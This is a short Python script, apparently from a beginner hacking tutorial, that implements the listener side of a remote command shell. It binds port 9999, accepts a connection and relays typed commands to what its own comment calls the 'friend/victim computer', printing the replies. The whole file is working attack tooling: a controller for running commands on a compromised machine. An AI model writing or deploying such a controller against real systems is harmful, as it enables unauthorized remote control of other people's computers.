import socket
import sys


# create a socket : connect to computer 
def create_socket():
  try:
    global host 
    global port
    global s
    host = ""
    port = 9999
    s= socket.socket()

  except socket.error as msg:
    print("socket sreation error " + str(msg))

#  binding the host and port and listening for the conections 
def bind_socket():
  try:
    global host 
    global port 
    global s

    print("Binding the port with host " + str(port))

    s.bind((host,port))
    s.listen(5)

  except socket.error as msg:
    print("socket binding error" + str(msg)+ "retiring...")
    bind_socket()


# establishing coonection with client after lisenting
def socket_accept():
  connection , address= s.accept()
  print("connection has been established with ip address" +address[0] + "and port number  " + str(address[1]))
  send_command(connection)
  connection.close()


# send a command to the friend/victim computer 
def send_command(connection):
  while True:
    cmd=input()
    if cmd == 'quit':
      connection.close()
      s.close()
      sys.exit()
    
    if len(str.encode(cmd)) > 0:
      connection.send(str.encode(cmd))
      client_response =  str(connection.recv(1024),"utf-8")
      print(client_response,end="") 


def main():
  create_socket()
  bind_socket() 
  socket_accept()

main()

